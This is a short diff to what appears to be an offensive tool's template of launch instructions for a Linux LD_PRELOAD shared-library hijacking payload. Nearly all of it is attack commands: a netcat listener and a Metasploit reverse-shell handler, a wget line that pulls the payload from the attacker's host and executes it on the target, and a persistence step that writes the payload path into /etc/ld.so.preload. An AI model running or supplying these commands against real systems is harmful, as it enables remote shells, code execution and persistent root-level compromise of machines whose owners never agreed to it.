@@ -82,14 +82,14 @@ output:
     C Linux LD_PRELOAD Shared Library Hijacking - Launch Instructions
 
     Start Listener:
-    nc -lvnp {{ lport }}
+    $ nc -lvnp {{ lport }}
 
     Or with Metasploit:
-    msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    $ msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
     Transfer and Execute:
-    python3 -m http.server 8080
-    On target: wget http://{{ lhost }}:8080/{{ output_file }} -O /tmp/{{ output_file }} && chmod +x /tmp/{{ output_file }} && LD_PRELOAD=/tmp/{{ output_file }} id
+    $ python3 -m http.server 80
+    $ wget http://{{ lhost }}/{{ output_file }} -O /tmp/{{ output_file }} && chmod +x /tmp/{{ output_file }} && LD_PRELOAD=/tmp/{{ output_file }} id
 
     Establish Persistence (System-Wide - Root Required):
     echo "/tmp/{{ output_file }}" > /etc/ld.so.preload
